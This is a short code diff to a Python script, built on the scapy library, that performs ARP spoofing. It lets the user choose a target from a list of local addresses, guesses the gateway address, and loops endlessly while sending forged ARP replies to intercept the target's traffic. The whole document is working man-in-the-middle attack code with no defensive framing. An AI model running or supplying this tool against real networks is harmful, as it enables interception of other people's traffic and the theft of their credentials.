@@ -14,13 +14,12 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
-# Example usage:
-target_ip = "192.168.1.2"  # IP of the target device
-spoof_ip = "192.168.1.1"    # IP of the router (gateway)
-
-def ARP_spoofing():
+def ARP_spoofing(ip_list):
     try:
-
+        choose = int(input("\n\nChoose the IP address: "))
+        target_ip = ip_list[choose]
+        # Using split and join method to spoof IP so it will be safer from possibility of target IP range and length
+        spoof_ip = '.'.join(target_ip.split('.')[0:3]) + '.1'
         print("Intercepting right now!!")
         while True:
             spoof(target_ip, spoof_ip)
@@ -33,5 +32,5 @@ def ARP_spoofing():
 
 if __name__ == '__main__':
     ip_list=Local_address.info()
-
+    ARP_spoofing(ip_list)
 
